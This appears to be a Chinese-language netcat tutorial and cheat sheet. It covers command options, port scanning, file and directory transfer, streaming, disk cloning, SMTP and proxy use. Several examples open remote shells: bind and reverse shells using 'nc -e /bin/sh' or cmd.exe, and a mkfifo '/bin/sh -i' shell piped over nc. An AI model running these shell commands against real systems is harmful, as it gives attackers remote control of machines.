## what

+ netcat 是网络工具中的瑞士军刀, 它能通过TCP和UDP在网络中读写数据
+ 通过与其他工具结合和重定向, 你可以在脚本中以多种方式使用
+ netcat 所做的就是在两台电脑间建立连接并返回两个数据流, 你能建立一个服务器, 传输文件, 与朋友聊天, 传输流媒体或者用它作为其它协议的独立客户端

### arguments
-h, 查看帮助信息
-d, 后台模式
-e, prog程序重定向, 一旦连接就执行(危险)
-g <网关>, 设置路由器跃程通信网关, 最多可设置8个
-G <指向器数目>, 设置来源路由指向器, 其数值为4的倍数
-i <延迟秒数>, 设置时间间隔, 以便传送信息及扫描通信端口
-l, 使用监听模式, 监控传入的资料
-L, 监听模式, 连接关闭后仍然继续监听, 直到CTR+C
-n, 直接使用IP地址, 不使用DNS反向查询IP地址的域名
-o <输出文件>, 指定文件名称, 把往来传输的数据以16进制字码倾倒成该文件保存
-p <通信端口>, 设置本地主机使用的通信端口
-r, 乱数指定本地与远程主机的通信端口
-s <来源地址>, 设置本地主机送出数据包的IP地址
-t, 使用Telnet交互方式
-u, 使用UDP传输协议
-v, 详细输出, 用-vv将更详细
-w <超时秒数>, 设置等待连线的时间
-z, 使用0输入/输出模式, 连接成功后立即关闭连接, 只在扫描通信端口时使用
-q <秒数>, 接收到EOF后隔多长时间退出


## how

### 端口扫描
可以运行在TCP或者UDP模式, 默认是TCP, -u参数调整为UDP
> nc -z -v -n -w 5 172.31.100.7 21-25
这个命令会打印21到25所有开放的端口
> nc -v 172.31.100.7 21
一旦发现开放的端口, 使用netcat连接服务抓取banner
Banner是一个你连接的服务发送给你的文本信息
当你试图鉴别漏洞或者服务的类型和版本时, Banner信息非常有用
但并不是所有服务都会发送Banner

### 正向连接
-c string, 连接后执行一条shell命令
-e filename, 连接后运行一个文件
Server(A机器:172.31.100.7):
> nc -l -p 2222 -e /bin/sh //linux
> nc -l -p 2222 -e cmd.exe //windows
Client(B机器:172.31.100.23):
> nc 172.31.100.7 2222

### 反向连接
Server(A):
> nc -vv -l -p 2222
Client(B):
> nc -e /bin/sh 172.31.100.23 2222 //linux
> nc -e cmd.exe 172.31.100.23 2222 //windows

### Chat Server
Server(A):
> nc -l -p 1567
netcat命令在1567端口启动了一个tcp服务器
所有的标准输出和输入会输出到该端口, 输出和输入都在该shell中展示
Client(B):
> nc 172.31.100.7 1567
不管你在机器B上键入什么都会在机器A上

### 文件传输
Server(A):
> nc -l -p 1567 < file.txt
Client(B):
> nc -n 172.31.100.7 1567 > file.txt
在A机器创建服务器并且重定向输入文件为file.txt
当B机器连接到A, A发送文件内容, B保存文件内容到file.txt
Server(B):
> nc -l -p 1567 > file.txt
Client(A):
> nc 172.31.100.23 1567 < file.txt
发送文件从A到B, 但是服务器创建在B上

### 目录传输
Server(A):
> tar -cvf - dir_name | nc -l -p 1567
Client(B):
> nc -n 172.31.100.7 1567 | tar -xvf -
在A服务器上, 创建一个tar归档包并通过-在控制台重定向它, 然后使用管道, 重定向给netcat
在客户端通过netcat下载归档包
Server(A):
> tar -cvf - dir_name | bzip2 -z | nc -l -p 1567
Client(B):
> nc -n 172.31.100.7 1567 | bzip2 -d | tar -xvf -

### 加密通过网络发送的数据
Server(A):
> mcrypt --flush --bare -F -q -m ecb < file.txt | nc -l -p 1567
Client(B):
> nc 172.31.100.7 1567 | mcrypt --flush --bare -F -q -d -m ecb > file.txt

### 流视频
Server(A):
> cat video.avi | nc -l -p 1567
Client(B):
> nc 172.31.100.7 1567 | mplayer -vo x11 --cache 3000 -

### 克隆一个设备
Server(A):
> dd if=/dev/sda | nc -l -p 1567
Client(B):
> nc 172.31.100.7 1567 | dd of=/dev/sda
10. 手动使用SMTP协议通信
> nc localhost 25 << EOF
> HELO host.example.com
> MAIL FROM: <user@host.example.com>
> RCPT TO: <user2@host.example.com>
> DATA
> Body of email.
> .
> QUIT
> EOF

### 通过代理服务器连接
> nc -x10.2.3.4:8080 -Xconnect host.example.com 42
使用10.2.3.4:8080这个代理服务器, 连接到host.example.com的42端口

### 使用Unix Domain Socket
> nc -lU /var/tmp/dsocket
建立一个Unix Domain Socket, 并接收资料


## funny

### 不停监听模式(有的nc命令是-k参数)
> nc -L -p 80 > logs.txt //开启并不停的监听80端口, 直到CTR+C, 同时把结果输出到logs.txt
> nc -L -p 80 < files.txt //同时把files.txt文件内容送入管道中

### 特殊打开shell方式
Server(A):
> mkfifo /tmp/tmp_fifo  //创建fifo文件
> cat /tmp/tmp_fifo | /bin/sh -i 2>&1 | nc -l -p 1567 > /tmp/tmp_fifo
从网络收到的输入写入到fifo文件中
cat命令读取fifo文件并将其内容发给sh命令
sh命令进程收到输入并把它写回到netcat
netcat通过网络发送输出到client
(管道命令平行执行, fifo文件用来替代正常文件, 因为fifo使读取等待,
如果是一个普通文件, cat命令会尽快结束并开始读取空文件)
Client(B):
> nc -n 172.31.100.7 1567
在客户端会有一个shell提示符

### 其他用途
1. 使用-t选项模拟Telnet客户端
2. HTTP客户端用于下载文件
3. 连接邮件服务器, 使用SMTP协议检查邮件
4. 使用ffmpeg截取屏幕并通过流式传输分享
只要你了解协议就可以使用netcat作为网络通讯媒介, 实现各种客户端

### Remarks
cmd编码支持utf-8, chcp命令
> chcp  //查看当前编码, 默认为936(GB2312)
> chcp 65001  //切换为UTF-8, 活动代码页为65001
